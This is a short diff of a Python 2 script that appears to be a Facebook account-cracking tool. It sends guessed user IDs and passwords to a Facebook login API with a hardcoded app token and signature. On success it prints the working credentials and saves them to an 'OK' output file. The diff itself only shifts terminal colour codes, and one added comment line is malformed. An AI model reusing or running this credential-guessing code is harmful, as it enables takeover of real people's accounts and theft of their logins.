@@ -222,7 +222,7 @@ def publik():
     try:
         mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
         kntl = json.loads(mmk.text)
-        #print' [+] Nama : ' + sp['name']
+        #print' [+] Nama : ' \033[1;90m+ sp['name']
     except KeyError:
         print'[!] \033[1;91mID Not Available!'
         menu()
@@ -320,7 +320,7 @@ def bapi():
 				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				respon = requests.get(api,params=param, headers=kontol)
 				if "session_key" in respon.text and "EAAA" in respon.text:
-					print '\r  \033[0;92mCP '\033[1;90m +uid+ '|' + pw + '        '
+					print '\r  \033[0;92mCP ' +uid+ '|' + pw + '        '
 					ok.append(uid+'|'+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  *--> '+str(uid)+'|'+str(pw)+'\n')
